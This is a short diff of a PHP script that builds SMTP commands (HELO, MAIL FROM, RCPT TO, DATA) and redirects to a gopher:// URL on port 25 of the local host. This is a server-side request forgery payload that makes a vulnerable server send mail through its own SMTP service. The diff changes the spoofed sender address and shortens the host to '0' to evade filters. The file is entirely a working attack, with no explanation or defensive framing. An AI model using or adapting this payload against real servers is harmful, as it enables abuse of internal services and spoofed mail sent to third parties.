@@ -1,7 +1,7 @@
 <?php
         $commands = array(
                 'HELO hackertarget.com',
-                'MAIL FROM: <maaek@postmarkapp.com>',
+                'MAIL FROM: <ardept@irobot.com>',
                 'RCPT To: <gotopo@app-mailer.com>',
                 'DATA',
                 'Subject: corben!',
@@ -11,5 +11,5 @@
 
         $payload = implode('%0A', $commands);
 
-        header('Location: gopher://0.0.0.0:25/_'.$payload);
+        header('Location: gopher://0:25/_'.$payload);
 ?>
